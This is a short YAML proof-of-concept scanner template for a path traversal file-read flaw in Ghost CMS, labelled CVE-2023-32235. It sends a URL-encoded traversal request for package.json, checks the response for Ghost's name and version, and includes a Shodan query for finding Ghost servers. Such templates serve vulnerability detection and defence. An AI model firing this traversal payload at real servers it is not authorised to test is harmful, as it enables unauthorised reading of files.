id: poc-yaml-ghost-assets-file-read
info:
  name: Ghost 文件读取漏洞(CVE-2023-32235)
  severity: high
  tags:
  - CVE-2023-32235
  - 任意文件或目录访问
  finger: ghost
  shodan: http.component:"Ghost"
requests:
- method: GET
  path: /assets/built%2F..%2F..%2F/package.json
  expression: 'status_code == 200

    && contains(body,"ghost")

    && contains(body,"name")

    && contains(body,"version")

    '
variables: {}
transport: http
